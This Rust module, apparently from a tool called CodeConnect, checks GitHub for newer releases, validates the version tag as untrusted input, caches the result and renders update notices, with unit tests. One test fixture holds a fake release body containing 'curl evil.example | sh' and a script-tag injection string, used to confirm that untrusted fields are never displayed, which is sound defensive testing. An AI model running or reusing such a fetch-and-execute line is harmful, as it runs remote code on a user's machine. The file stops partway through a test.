//! The "a newer CodeConnect exists" notice, and the machinery behind it.
//!
//! A user who runs `codeconnect claude` every day has no reason to think
//! about upgrading, so the launch tells them — under three rules that keep
//! the telling honest and the launch fast:
//!
//!   * **The launch path never touches the network.** The notice is read
//!     from a cache file; the cache is refreshed by a fully detached child
//!     spawned just before the attach, at most once per 24 hours. A slow or
//!     absent network costs the launch nothing.
//!   * **"Newer" means a published GitHub Release**, semantically greater
//!     than this binary's own version — never "a commit exists". The feature
//!     is deliberately dormant until the project starts cutting releases;
//!     the ship contract from then on is: bump the workspace version, tag
//!     that exact commit `vX.Y.Z`, publish the Release, versions strictly
//!     increasing, never retag.
//!   * **The tag is a trust boundary.** It comes from a third-party API
//!     response, so nothing from that response is compared or printed until
//!     it has survived a full-match semver validation; every other response
//!     field is discarded unread. An error — 404, rate limit, timeout,
//!     malformed JSON — is not evidence and produces silence, preserving
//!     whatever validated answer the cache already held.
//!
//! `update_check: false` in the config disables both the network attempt
//! and the cached notice. The daemon never phones home either way.

use std::path::PathBuf;

use anyhow::{Context, Result};
use serde::{Deserialize, Serialize};

/// Where the checker's answer lives between launches.
fn cache_path() -> PathBuf {
    protocol::root_dir().join("update-check.json")
}

/// The claim that makes the 24-hour throttle hold across processes — two
/// `codeconnect claude` launches in the same second must produce at most one
/// GitHub request. The atom is `flock(2)`, and the kernel is the whole
/// protocol: a lock dies with its holder, so there are no corpses to detect,
/// no birth-times to compare, and no takeover race between two would-be
/// breakers. A file-content lock needs all three, and each is its own race:
/// a created-then-written lock is momentarily empty and reads as a corpse,
/// and two breakers judging one corpse can each delete the other's fresh
/// claim. The lock file itself is permanent and contentless.
fn lock_path() -> PathBuf {
    protocol::root_dir().join(".update-check.lock")
}

const ATTEMPT_INTERVAL_SECS: u64 = 24 * 60 * 60;
/// A Releases response is a few hundred bytes of interest; a response bigger
/// than this is not one we read further.
const MAX_RESPONSE_BYTES: u64 = 64 * 1024;

#[derive(Debug, Clone, Serialize, Deserialize, Default)]
pub struct UpdateCache {
    /// When the checker last *tried*, successful or not — the 24h throttle.
    #[serde(default)]
    pub last_attempt_unix: u64,
    /// The last validated answer to "what is the latest release", kept
    /// verbatim (`1.2.3`, no `v`). Mirrors the server: each validated fetch
    /// replaces it, whatever it says; only *failures* preserve the previous
    /// answer. The notice, not the cache, decides what counts as newer.
    #[serde(default)]
    pub latest: Option<String>,
}

// ---------------------------------------------------------------- versions

/// Parse a version or a release tag into its numeric triple.
///
/// Full-match and ASCII-only on purpose: this is the entire trust boundary
/// for a string a third party controls. An optional leading `v` is the one
/// tag convention accepted; anything else — whitespace, suffixes, control
/// characters, Unicode digits, a fourth component, leading zeroes — is not a
/// version, and "not a version" must never become "version zero".
pub fn parse_version(raw: &str) -> Option<(u64, u64, u64)> {
    let body = raw.strip_prefix('v').unwrap_or(raw);
    let mut parts = body.split('.');
    let (a, b, c) = (parts.next()?, parts.next()?, parts.next()?);
    if parts.next().is_some() {
        return None;
    }
    let component = |part: &str| -> Option<u64> {
        if part.is_empty() || !part.bytes().all(|b| b.is_ascii_digit()) {
            return None;
        }
        if part.len() > 1 && part.starts_with('0') {
            return None;
        }
        part.parse::<u64>().ok()
    };
    Some((component(a)?, component(b)?, component(c)?))
}

/// The version compiled into this binary. The `expect` is exercised by a
/// test, which is what makes it a release-gate rather than a hope: a
/// workspace version this parser refuses would fail CI before it failed a
/// user.
pub fn installed_version() -> (u64, u64, u64) {
    parse_version(env!("CARGO_PKG_VERSION")).expect("CARGO_PKG_VERSION is not a plain X.Y.Z semver")
}

// ------------------------------------------------------------------ cache

/// Read the cache, revalidating the stored version — a cache written by
/// anything, including a future or corrupted build, gets the same trust
/// boundary as the network response.
pub fn read_cache() -> UpdateCache {
    read_cache_from(&cache_path())
}

fn read_cache_from(path: &std::path::Path) -> UpdateCache {
    let Ok(bytes) = std::fs::read(path) else {
        return UpdateCache::default();
    };
    let Ok(mut cache) = serde_json::from_slice::<UpdateCache>(&bytes) else {
        return UpdateCache::default();
    };
    if let Some(latest) = &cache.latest {
        if parse_version(latest).is_none() {
            cache.latest = None;
        }
    }
    cache
}

/// Atomic write: unique temp file beside the target, then rename, so an
/// interrupted write leaves the previous record readable rather than half a
/// JSON document.
fn write_cache_to(path: &std::path::Path, cache: &UpdateCache) -> Result<()> {
    let parent = path
        .parent()
        .context("the cache path has no parent directory")?;
    std::fs::create_dir_all(parent)?;
    let temp = parent.join(format!(".update-check.{}.tmp", std::process::id()));
    std::fs::write(&temp, serde_json::to_vec(cache)?)?;
    std::fs::rename(&temp, path)?;
    Ok(())
}

/// Holds the kernel lock for as long as it lives; dropping — or dying, in
/// any way — is what releases it. `flock` locks belong to the open file
/// description, and the kernel cleans up when that closes.
struct ThrottleClaim {
    _file: std::fs::File,
}

fn claim_throttle_at(path: &std::path::Path) -> Option<ThrottleClaim> {
    if let Some(parent) = path.parent() {
        let _ = std::fs::create_dir_all(parent);
    }
    let file = std::fs::OpenOptions::new()
        .write(true)
        .create(true)
        .truncate(false)
        .open(path)
        .ok()?;
    use std::os::fd::AsRawFd;
    // Non-blocking exclusive: the loser leaves rather than queues — a
    // second simultaneous launch has nothing to wait for, the winner is
    // already doing the day's one check.
    let rc = unsafe { libc::flock(file.as_raw_fd(), libc::LOCK_EX | libc::LOCK_NB) };
    if rc != 0 {
        return None;
    }
    Some(ThrottleClaim { _file: file })
}

/// Whether the 24-hour throttle permits an attempt now. A future
/// `last_attempt` is a clock that moved backwards; treating it as "recently
/// attempted" would silence the checker for however far forward the clock
/// had wandered, so it reads as due.
pub fn attempt_due(cache: &UpdateCache, now_unix: u64) -> bool {
    cache.last_attempt_unix > now_unix
        || now_unix - cache.last_attempt_unix >= ATTEMPT_INTERVAL_SECS
}

// ----------------------------------------------------------------- notice

/// The fact an update surface renders: what is installed, what exists.
/// Semantic on purpose — the pre-attach slot and `daemon status` style for
/// different streams, so the *data* is shared and the rendering is not.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct UpdateAdvisory {
    pub installed: (u64, u64, u64),
    pub latest: String,
}

/// The advisory, or `None` while this binary is current (or nothing
/// validated is known). Pure, so the comparison is pinned.
pub fn update_advisory(cache: &UpdateCache, installed: (u64, u64, u64)) -> Option<UpdateAdvisory> {
    let latest_raw = cache.latest.as_deref()?;
    let latest = parse_version(latest_raw)?;
    if latest <= installed {
        return None;
    }
    Some(UpdateAdvisory {
        installed,
        latest: latest_raw.to_string(),
    })
}

/// The advisory for the current install, from the cache on disk.
pub fn cached_advisory() -> Option<UpdateAdvisory> {
    update_advisory(&read_cache(), installed_version())
}

// ------------------------------------------------------- checkout advisory

/// The local half of "am I current?": how the recorded checkout relates to
/// the code this binary was built from. `None` is silence — record missing,
/// checkout moved, git absent, budget breached, or simply *matching* — and
/// silence is the correct rendering of every one of those.
///
/// This outranks the release advisory when both would fire: it is the more
/// specific fact (a release compares version *numbers*, which stand still
/// between releases; this compares the actual code), and the fix is the same
/// `codeconnect update` either way.
pub fn checkout_advisory() -> Option<protocol::build_identity::CheckoutRelation> {
    use protocol::build_identity::CheckoutRelation;
    // Filesystem checks only on this path — `recorded_checkout_at`'s git
    // validation is unbounded (fine for `codeconnect update`, which the
    // user asked for and can interrupt), and a wedged git before the budget
    // started would hang every launch. The budgeted relation's own git
    // calls ARE the work-tree validation here: a non-repo answers None,
    // which renders as the silence it should.
    let record = std::fs::read_to_string(checkout_record_path()).ok()?;
    let root = PathBuf::from(record.trim());
    if !root.join("mac/install.sh").is_file() {
        return None;
    }
    match protocol::build_identity::checkout_relation(&root)? {
        CheckoutRelation::Matches => None,
        other => Some(other),
    }
}

/// One slot, two candidates: the checkout comparison outranks the release
/// advisory because it is the more specific fact — a release compares
/// version numbers, which stand still between releases; the checkout
/// comparison reads the actual code. Both resolve with the same command.
pub fn select_update_note(
    checkout: Option<protocol::build_identity::CheckoutRelation>,
    release: Option<UpdateAdvisory>,
    style: Style,
) -> Option<String> {
    checkout
        .map(|relation| render_checkout(&relation, style))
        .or_else(|| release.map(|advisory| render_update(&advisory, style)))
}

/// The exact advisory text for each non-matching relation. Grammar shared
/// with the release advisory: bold heading and bold action line in Styled,
/// identical visible text across styles, `·` becoming `:` in Ascii.
pub fn render_checkout(
    relation: &protocol::build_identity::CheckoutRelation,
    style: Style,
) -> String {
    use protocol::build_identity::CheckoutRelation;
    match relation {
        // Unreachable by construction — `checkout_advisory` filters it — but
        // a caller handing it in deserves silence, not a lie.
        CheckoutRelation::Matches => String::new(),
        CheckoutRelation::Newer(count) => {
            let commits = if *count == 1 {
                "1 commit".to_string()
            } else {
                format!("{count} commits")
            };
            match style {
                Style::Styled => format!(
                    "{BOLD}CodeConnect checkout is newer{RESET} \u{b7} {commits} not \
                     installed\n\n{BOLD}codeconnect update{RESET}"
                ),
                Style::PlainUnicode => format!(
                    "CodeConnect checkout is newer \u{b7} {commits} not installed\n\n\
                     codeconnect update"
                ),
                Style::Ascii => format!(
                    "CodeConnect checkout is newer: {commits} not installed\n\ncodeconnect update"
                ),
            }
        }
        CheckoutRelation::DirtyCheckout => match style {
            Style::Styled => concat!(
                "\u{1b}[1mCodeConnect checkout has uninstalled changes\u{1b}[0m\n",
                "Commit or stash the uncommitted changes, then run:\n\n",
                "\u{1b}[1mcodeconnect update\u{1b}[0m"
            )
            .to_string(),
            Style::PlainUnicode | Style::Ascii => concat!(
                "CodeConnect checkout has uninstalled changes\n",
                "Commit or stash the uncommitted changes, then run:\n\n",
                "codeconnect update"
            )
            .to_string(),
        },
        CheckoutRelation::Differs => match style {
            Style::Styled => concat!(
                "\u{1b}[1mCodeConnect build differs from its checkout\u{1b}[0m\n\n",
                "\u{1b}[1mcodeconnect update\u{1b}[0m"
            )
            .to_string(),
            Style::PlainUnicode | Style::Ascii => {
                "CodeConnect build differs from its checkout\n\ncodeconnect update".to_string()
            }
        },
    }
}

/// How a terminal advisory may dress itself. Decided per destination
/// stream, never globally: pre-attach writes stderr, `daemon status` writes
/// stdout, and each answers for its own.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Style {
    /// A TTY that took no styling opt-outs: SGR bold plus typographic
    /// unicode.
    Styled,
    /// A TTY under `NO_COLOR`: the convention disables SGR — all of it,
    /// bold included — but says nothing about characters, so the
    /// typography stays.
    PlainUnicode,
    /// Not a TTY, or `TERM=dumb`: pure ASCII, no escapes, fit for logs and
    /// pipes.
    Ascii,
}

/// The one styling decision, from the three documented signals. `NO_COLOR`
/// counts when *present*, even empty — that is the convention's own rule.
pub fn style_for(is_tty: bool, term: Option<&str>, no_color_present: bool) -> Style {
    if !is_tty || term == Some("dumb") {
        return Style::Ascii;
    }
    if no_color_present {
        return Style::PlainUnicode;
    }
    Style::Styled
}

/// `style_for`, fed from an environment lookup — injected, so the adapter
/// itself is testable without mutating the process environment (a race
/// against every parallel test). Production passes the real environment.
pub fn style_from_env(is_tty: bool, env: impl Fn(&str) -> Option<std::ffi::OsString>) -> Style {
    let term = env("TERM").map(|value| value.to_string_lossy().into_owned());
    style_for(is_tty, term.as_deref(), env("NO_COLOR").is_some())
}

/// The production adapter: the real environment for a given stream.
pub fn style_for_stream(is_tty: bool) -> Style {
    style_from_env(is_tty, |name| std::env::var_os(name))
}

const BOLD: &str = "\u{1b}[1m";
const RESET: &str = "\u{1b}[0m";

/// The `daemon status` block for the advisory: rendered for *stdout*'s own
/// styling signals, and by construction free of any countdown — status is a
/// listing, not a doorway, and it never holds anyone.
pub fn status_update_block(
    advisory: &UpdateAdvisory,
    stdout_is_tty: bool,
    term: Option<&str>,
    no_color_present: bool,
) -> String {
    render_update(advisory, style_for(stdout_is_tty, term, no_color_present))
}

/// Render the update advisory for one stream.
///
/// The block is margin-free and label-free: a fact line, a blank line, and
/// the command alone — nothing for the eye to climb over. Bold is the only
/// emphasis; an available update is news, not a warning, so no colour.
pub fn render_update(advisory: &UpdateAdvisory, style: Style) -> String {
    let (a, b, c) = advisory.installed;
    let latest = &advisory.latest;
    match style {
        Style::Styled => format!(
            "{BOLD}CodeConnect update available{RESET} \u{b7} {a}.{b}.{c} \u{2192} {latest}\n\n\
             {BOLD}codeconnect update{RESET}"
        ),
        Style::PlainUnicode => format!(
            "CodeConnect update available \u{b7} {a}.{b}.{c} \u{2192} {latest}\n\n\
             codeconnect update"
        ),
        Style::Ascii => {
            format!("CodeConnect update available: {a}.{b}.{c} -> {latest}\n\ncodeconnect update")
        }
    }
}

#[cfg(test)]
mod checkout_advisory_tests {
    use super::*;
    use protocol::build_identity::CheckoutRelation;

    #[test]
    fn newer_renders_exactly_in_all_three_styles() {
        let two = CheckoutRelation::Newer(2);
        assert_eq!(
            render_checkout(&two, Style::Styled),
            "\u{1b}[1mCodeConnect checkout is newer\u{1b}[0m \u{b7} 2 commits not \
             installed\n\n\u{1b}[1mcodeconnect update\u{1b}[0m"
        );
        assert_eq!(
            render_checkout(&two, Style::PlainUnicode),
            "CodeConnect checkout is newer \u{b7} 2 commits not installed\n\ncodeconnect update"
        );
        assert_eq!(
            render_checkout(&two, Style::Ascii),
            "CodeConnect checkout is newer: 2 commits not installed\n\ncodeconnect update"
        );
    }

    #[test]
    fn one_commit_is_singular() {
        assert_eq!(
            render_checkout(&CheckoutRelation::Newer(1), Style::Ascii),
            "CodeConnect checkout is newer: 1 commit not installed\n\ncodeconnect update"
        );
    }

    #[test]
    fn dirty_and_differs_render_their_exact_sentences() {
        assert_eq!(
            render_checkout(&CheckoutRelation::DirtyCheckout, Style::PlainUnicode),
            "CodeConnect checkout has uninstalled changes\n\
             Commit or stash the uncommitted changes, then run:\n\ncodeconnect update"
        );
        assert_eq!(
            render_checkout(&CheckoutRelation::DirtyCheckout, Style::Styled),
            "\u{1b}[1mCodeConnect checkout has uninstalled changes\u{1b}[0m\n\
             Commit or stash the uncommitted changes, then run:\n\n\
             \u{1b}[1mcodeconnect update\u{1b}[0m"
        );
        assert_eq!(
            render_checkout(&CheckoutRelation::Differs, Style::Ascii),
            "CodeConnect build differs from its checkout\n\ncodeconnect update"
        );
    }

    /// The Ascii renderer's whole contract: 7-bit bytes, no escapes, no
    /// typography, nothing over 80 columns, no trailing whitespace.
    #[test]
    fn ascii_checkout_advisories_are_pure() {
        for relation in [
            CheckoutRelation::Newer(1),
            CheckoutRelation::Newer(42),
            CheckoutRelation::DirtyCheckout,
            CheckoutRelation::Differs,
        ] {
            let rendered = render_checkout(&relation, Style::Ascii);
            assert!(rendered.is_ascii(), "{relation:?}: {rendered:?}");
            assert!(!rendered.contains('\u{1b}'), "{relation:?}");
            for line in rendered.lines() {
                assert!(line.len() <= 80, "{relation:?}: {line:?}");
                assert_eq!(line.trim_end(), line, "{relation:?}: trailing space");
            }
        }
    }

    /// The dirty and differs sentences are style-invariant in visible text:
    /// styling may bold, never reword.
    #[test]
    fn styling_never_rewords() {
        for relation in [CheckoutRelation::DirtyCheckout, CheckoutRelation::Differs] {
            let styled = render_checkout(&relation, Style::Styled)
                .replace("\u{1b}[1m", "")
                .replace("\u{1b}[0m", "");
            assert_eq!(styled, render_checkout(&relation, Style::PlainUnicode));
        }
    }

    #[test]
    fn matches_renders_as_nothing() {
        assert_eq!(
            render_checkout(&CheckoutRelation::Matches, Style::Styled),
            ""
        );
    }

    /// The one-slot rule: when both facts exist, the checkout speaks and the
    /// release stays quiet — never two blocks.
    #[test]
    fn the_checkout_outranks_the_release_in_the_one_slot() {
        let release = UpdateAdvisory {
            installed: (0, 2, 0),
            latest: "v0.3.0".into(),
        };
        let both = select_update_note(
            Some(CheckoutRelation::Newer(2)),
            Some(release.clone()),
            Style::Ascii,
        )
        .unwrap();
        assert!(both.contains("checkout is newer"), "{both}");
        assert!(
            !both.contains("update available"),
            "one slot means one block"
        );

        let release_only = select_update_note(None, Some(release), Style::Ascii).unwrap();
        assert!(release_only.contains("update available"), "{release_only}");
        assert_eq!(select_update_note(None, None, Style::Ascii), None);
    }
}

// ---------------------------------------------------------------- checker

/// Spawn the detached checker if the throttle permits. Fire-and-forget: null
/// stdio, its own process group, never waited on — the attach that follows
/// replaces this process, and the child must outlive it without owning the
/// terminal.
pub fn spawn_checker_if_due() {
    if !attempt_due(&read_cache(), unix_now()) {
        return;
    }
    let Ok(current) = std::env::current_exe() else {
        return;
    };
    use std::os::unix::process::CommandExt;
    let _ = std::process::Command::new(current)
        .arg("__update-check")
        .stdin(std::process::Stdio::null())
        .stdout(std::process::Stdio::null())
        .stderr(std::process::Stdio::null())
        .process_group(0)
        .spawn();
}

/// The hidden child: ask GitHub for the latest release and update the cache.
///
/// Every failure path still advances `last_attempt` — a flaky network must
/// throttle like a healthy one — and preserves the previously validated
/// `latest`. Config is consulted here too, so a child spawned an instant
/// before the operator wrote `update_check: false` still obeys it.
pub fn run_checker() -> Result<()> {
    if !protocol::config::Config::load().update_check {
        return Ok(());
    }
    run_checker_with(
        &cache_path(),
        &lock_path(),
        unix_now(),
        fetch_latest_release_tag,
    )
}

/// The checker's whole discipline, fetch injected so a test can prove the
/// ordering without a network:
///
///   1. take the cross-process lock, or leave — two simultaneous launches
///      spawn two children, and at most one may go to GitHub;
///   2. re-check the throttle *under* the lock — the parent's check was
///      against a cache another child may have advanced since;
///   3. claim the attempt (persist `last_attempt`) **before** fetching, so a
///      child that dies mid-fetch still throttled — a crashing checker must
///      not retry every launch;
///   4. fetch, and only a validated answer replaces `latest`.
fn run_checker_with(
    cache_file: &std::path::Path,
    lock_file: &std::path::Path,
    now_unix: u64,
    fetch: impl FnOnce() -> Option<String>,
) -> Result<()> {
    let Some(_claim) = claim_throttle_at(lock_file) else {
        return Ok(());
    };
    let mut cache = read_cache_from(cache_file);
    if !attempt_due(&cache, now_unix) {
        return Ok(());
    }
    cache.last_attempt_unix = now_unix;
    write_cache_to(cache_file, &cache)?;
    if let Some(tag) = fetch() {
        // Normalized without the `v`, so the cache holds exactly what the
        // notice prints.
        let normalized = tag.strip_prefix('v').unwrap_or(&tag).to_string();
        cache.latest = Some(normalized);
        write_cache_to(cache_file, &cache)?;
    }
    Ok(())
}

/// The latest published release's tag, if the network, the API and the
/// validation all cooperate. `None` is silence, never evidence.
fn fetch_latest_release_tag() -> Option<String> {
    let output = std::process::Command::new("/usr/bin/curl")
        .args([
            // First, always: without it curl reads ~/.curlrc, which can add
            // URLs, redirect output or attach headers — and the README's
            // promise is one documented request, not one plus whatever a
            // dotfile says.
            "-q",
            "-fsS",
            "--max-time",
            "5",
            "--max-filesize",
            "65536",
            "-H",
            "Accept: application/vnd.github+json",
            // The one non-tailnet request CodeConnect ever makes, documented
            // in the README's privacy note and disabled by `update_check:
            // false`. GitHub's "latest" is the newest published non-draft,
            // non-prerelease Release.
            "https://api.github.com/repos/faisalmumtaz89/CodeConnect/releases/latest",
        ])
        .stdin(std::process::Stdio::null())
        .output()
        .ok()?;
    if !output.status.success() {
        return None;
    }
    parse_release_tag(&output.stdout)
}

/// Extract and validate `tag_name` — the only field this feature is allowed
/// to read. The deserialization target *has* no other fields, so the rest of
/// the response is skipped by the parser rather than materialized and then
/// ignored: untrusted text never exists in memory as anything but the bytes
/// it arrived in.
pub fn parse_release_tag(body: &[u8]) -> Option<String> {
    #[derive(serde::Deserialize)]
    struct LatestRelease {
        tag_name: String,
    }
    let capped = &body[..body.len().min(MAX_RESPONSE_BYTES as usize)];
    let release = serde_json::from_slice::<LatestRelease>(capped).ok()?;
    parse_version(&release.tag_name)?;
    Some(release.tag_name)
}

// ------------------------------------------------------------------- hold

/// One countdown frame: carriage return, erase-line, the sentence. The
/// cursor controls are not SGR, so `NO_COLOR` does not touch them.
pub fn countdown_frame(seconds_left: u64) -> String {
    format!("\r\u{1b}[2KContinuing in {seconds_left}s\u{2026} Press Return to continue now.")
}

/// The erase that removes the countdown before the attach takes the screen.
pub const COUNTDOWN_CLEAR: &str = "\r\u{1b}[2K";

/// Hold the terminal for reading, honestly: a countdown, because nothing is
/// working — the session already exists, and the pause exists for the
/// reader. `10` shows immediately; frames follow *elapsed monotonic time*
/// (a delayed tick shows the true remainder, never replays missed numbers);
/// `0` is never shown; Return — or stdin closing — ends the hold at once.
pub fn hold_for_reading(
    total: std::time::Duration,
    skip: &std::sync::mpsc::Receiver<()>,
    out: &mut dyn std::io::Write,
    mut now: impl FnMut() -> std::time::Instant,
) {
    let start = now();
    let mut last_shown: Option<u64> = None;
    loop {
        let elapsed = now().saturating_duration_since(start);
        if elapsed >= total {
            break;
        }
        let remainder = total - elapsed;
        let left = (remainder.as_secs_f64().ceil() as u64).max(1);
        // A timer that wakes a millisecond shy of the boundary recomputes
        // the same number; re-emitting it would double a frame. The number
        // is the frame's identity — an unchanged number writes nothing.
        if last_shown != Some(left) {
            last_shown = Some(left);
            let _ = write!(out, "{}", countdown_frame(left));
            let _ = out.flush();
        }
        // Sleep until the displayed number is due to change — remainder
        // minus the whole seconds the current frame still covers — never a
        // fixed distance to a boundary the wake-up jitter can straddle.
        let until_change =
            remainder.saturating_sub(std::time::Duration::from_secs(left.saturating_sub(1)));
        let wait = until_change.max(std::time::Duration::from_millis(1));
        match skip.recv_timeout(wait) {
            Ok(()) => break,
            Err(std::sync::mpsc::RecvTimeoutError::Timeout) => continue,
            Err(std::sync::mpsc::RecvTimeoutError::Disconnected) => break,
        }
    }
    let _ = write!(out, "{COUNTDOWN_CLEAR}");
    let _ = out.flush();
}

/// The Return listener: canonical input, no raw mode — a completed line
/// *or EOF* is the signal (both return from `read_line`, both send). The
/// reader is injected so tests drive the real listener with real input
/// shapes; production hands it stdin. The thread parks in `read_line`;
/// when the hold ends first, the exec replaces this image, thread included.
pub fn spawn_line_listener(
    reader: impl std::io::Read + Send + 'static,
) -> std::sync::mpsc::Receiver<()> {
    let (tx, rx) = std::sync::mpsc::channel();
    std::thread::spawn(move || {
        let mut line = String::new();
        let mut reader = std::io::BufReader::new(reader);
        let _ = std::io::BufRead::read_line(&mut reader, &mut line);
        let _ = tx.send(());
    });
    rx
}

// ----------------------------------------------------------------- update

/// Where `install.sh` records the checkout it ran from, so `codeconnect
/// update` never has to ask the user where their clone lives.
fn checkout_record_path() -> PathBuf {
    protocol::root_dir().join("source-checkout")
}

/// The recorded checkout, if it still looks like one. Takes the record path
/// explicitly so tests exercise it against temp directories — mutating the
/// process environment in a parallel test suite races every other test that
/// reads the home directory.
fn recorded_checkout_at(record: &std::path::Path) -> std::result::Result<PathBuf, String> {
    let Ok(raw) = std::fs::read_to_string(record) else {
        return Err(format!(
            "no checkout is recorded at {} — this codeconnect was not \
             installed by ./install.sh from a clone on this machine",
            record.display()
        ));
    };
    let root = PathBuf::from(raw.trim());
    if !root.join("mac/install.sh").is_file() {
        return Err(format!(
            "the recorded checkout {} no longer contains mac/install.sh",
            root.display()
        ));
    }
    // Captured, not just exit-checked: `rev-parse --is-inside-work-tree`
    // exits 0 while printing `false` inside a bare repository. Only the
    // literal answer counts.
    let inside = std::process::Command::new("git")
        .args(["-C"])
        .arg(&root)
        .args(["rev-parse", "--is-inside-work-tree"])
        .stdin(std::process::Stdio::null())
        .output()
        .ok()
        .filter(|out| out.status.success())
        .map(|out| String::from_utf8_lossy(&out.stdout).trim() == "true")
        .unwrap_or(false);
    if !inside {
        return Err(format!(
            "the recorded checkout {} is not a git work tree any more",
            root.display()
        ));
    }
    Ok(root)
}

/// Whether the checkout has no local changes at all — tracked edits and
/// untracked files both count. `git pull --ff-only` alone is not this
/// check: a fast-forward can succeed over unrelated local edits, and the
/// installer would then build a tree that is neither the release nor the
/// user's own work.
fn checkout_is_clean(root: &std::path::Path) -> std::result::Result<bool, String> {
    let output = std::process::Command::new("git")
        .args(["-C"])
        .arg(root)
        .args(["status", "--porcelain"])
        .stdin(std::process::Stdio::null())
        .output()
        .map_err(|error| format!("running git status: {error}"))?;
    if !output.status.success() {
        return Err(format!("git status failed in {}", root.display()));
    }
    Ok(output.stdout.is_empty())
}

/// `codeconnect update`: pull the recorded checkout fast-forward-only, then
/// run its installer — which builds, installs, and restarts a managed
/// daemon. One command, because "find your clone and run a git chain" is
/// developer choreography no user should have to remember.
///
/// Failures stay loud and stop the chain: a dirty or diverged clone makes
/// `git pull --ff-only` refuse, and that refusal — git's own words — is
/// exactly what the user needs to see. Nothing here force-anythings.
pub fn run_update() -> Result<()> {
    let root = match recorded_checkout_at(&checkout_record_path()) {
        Ok(root) => root,
        Err(why) => {
            eprintln!("cannot update automatically: {why}.");
            eprintln!();
            eprintln!("update it the way it was installed — from your CodeConnect clone:");
            eprintln!();
            eprintln!("    git pull --ff-only && cd mac && ./install.sh");
            anyhow::bail!("no usable checkout record");
        }
    };
    // Refused outright, before any pull: a fast-forward would happily land
    // on top of unrelated local edits, and the build that followed would be
    // a mixture nobody asked for. The user's own changes are the user's —
    // update never decides what happens to them.
    if !checkout_is_clean(&root).map_err(|why| anyhow::anyhow!(why))? {
        eprintln!(
            "your checkout at {} has local changes (see `git status`).",
            root.display()
        );
        eprintln!("update refuses to build a mixed tree — commit or stash them, then rerun.");
        anyhow::bail!("checkout has local changes");
    }
    println!("updating from {}", root.display());
    let pulled = std::process::Command::new("git")
        .args(["-C"])
        .arg(&root)
        .args(["pull", "--ff-only"])
        .status()
        .context("running git pull")?;
    if !pulled.success() {
        anyhow::bail!(
            "git pull --ff-only refused (see above); resolve it in {} and rerun",
            root.display()
        );
    }
    let installed = std::process::Command::new("/bin/bash")
        .arg(root.join("mac/install.sh"))
        .status()
        .context("running install.sh")?;
    if !installed.success() {
        anyhow::bail!("install.sh failed (see above)");
    }
    Ok(())
}

fn unix_now() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0)
}

#[cfg(test)]
mod tests {
    use super::*;

    // ------------------------------------------------------------- parser

    #[test]
    fn the_parser_accepts_plain_and_v_prefixed_semver_and_nothing_else() {
        assert_eq!(parse_version("1.2.3"), Some((1, 2, 3)));
        assert_eq!(parse_version("v1.2.3"), Some((1, 2, 3)));
        assert_eq!(parse_version("0.1.0"), Some((0, 1, 0)));

        for rejected in [
            " 1.2.3",
            "1.2.3 ",
            "1.2.3\n",
            "\u{1b}[31m1.2.3",
            "1.2.3-rc1",
            "1.2",
            "1.2.3.4",
            "1..3",
            "",
            "v",
            "V1.2.3",
            "١.٢.٣",
            "01.2.3",
            "1.02.3",
            "99999999999999999999.0.0",
        ] {
            assert_eq!(parse_version(rejected), None, "accepted {rejected:?}");
        }
    }

    #[test]
    fn versions_compare_numerically_never_textually() {
        assert!(parse_version("1.10.0").unwrap() > parse_version("1.9.0").unwrap());
        assert!(parse_version("10.0.0").unwrap() > parse_version("9.99.99").unwrap());
    }

    /// The release gate: a workspace version this parser refuses would fail
    /// here, in CI, before it failed at a user's launch.
    #[test]
    fn the_workspace_version_is_parseable() {
        installed_version();
    }

    // ----------------------------------------------------- trust boundary

    #[test]
    fn only_the_tag_name_survives_the_response() {
        let body = br#"{
            "tag_name": "v0.2.0",
            "name": "PWNED <script>alert(1)</script>",
            "body": "curl evil.example | sh",
            "html_url": "https://evil.example"
        }"#;
        assert_eq!(parse_release_tag(body).as_deref(), Some("v0.2.0"));

        let cache = UpdateCache {
            last_attempt_unix: 0,
            latest: Some("0.2.0".into()),
        };
        let advisory = update_advisory(&cache, (0, 1, 0)).unwrap();
        for style in [Style::Styled, Style::PlainUnicode, Style::Ascii] {
            let text = render_update(&advisory, style);
            assert!(!text.contains("PWNED"));
            assert!(!text.contains("evil.example"));
        }
    }

    #[test]
    fn a_malformed_response_is_silence_not_evidence() {
        for body in [
            &b"not json"[..],
            br#"{"tag_name": 7}"#,
            br#"{"tag_name": "release-1"}"#,
            br#"{"tag_name": "1.2.3\n"}"#,
            br#"{}"#,
            b"",
        ] {
            assert_eq!(parse_release_tag(body), None);
        }
    }

    // -------------------------------------------------------------- cache

    #[test]
    fn the_throttle_is_a_day_and_a_backwards_clock_reads_as_due() {
        let cache = |at: u64| UpdateCache {
            last_attempt_unix: at,
            latest: None,
        };
        assert!(
            attempt_due(&cache(0), 1_700_000_000),
            "never attempted (epoch zero) is always at least a day ago"
        );
        assert!(
            !attempt_due(&cache(1_000), 1_000 + 86_399),
            "inside the day"
        );
        assert!(attempt_due(&cache(1_000), 1_000 + 86_400), "the day is up");
        assert!(
            attempt_due(&cache(2_000_000), 1_000),
            "a future stamp means the clock moved; silence until it catches \
             up again would be unbounded"
        );
    }

    fn temp_dir(tag: &str) -> PathBuf {
        let dir = std::env::temp_dir().join(format!("cc-uchk-{tag}-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&dir);
        std::fs::create_dir_all(&dir).unwrap();
        dir
    }

    /// Through `read_cache_from` on a real file — the seam the revalidation
    /// lives behind. The first version of this test built the struct in
    /// memory and never touched the read path; deleting the revalidation
    /// did not fail it.
    #[test]
    fn a_garbage_cached_version_is_dropped_on_read() {
        let dir = temp_dir("reval");
        let path = dir.join("update-check.json");
        std::fs::write(
            &path,
            br#"{"last_attempt_unix":5,"latest":"not-a-version"}"#,
        )
        .unwrap();
        let cache = read_cache_from(&path);
        assert_eq!(cache.latest, None, "garbage must not survive the read");
        assert_eq!(
            cache.last_attempt_unix, 5,
            "the throttle stamp is untainted"
        );
        assert_eq!(update_advisory(&cache, (0, 1, 0)), None);
        std::fs::remove_dir_all(&dir).ok();
    }

    // ------------------------------------------------------------- update

    /// The two honest refusals: no record at all, and a record whose
    /// checkout has stopped being one. Both name the path and both leave
    /// The honest refusals, each against a real filesystem shape and none
    /// touching process environment: no record; a record pointing at a
    /// directory that is not a checkout; a checkout that is not a git work
    /// tree — and then the acceptance, against a real `git init` work tree.
    #[test]
    fn the_checkout_record_is_validated_never_trusted() {
        let dir = temp_dir("checkout");
        let record = dir.join("source-checkout");

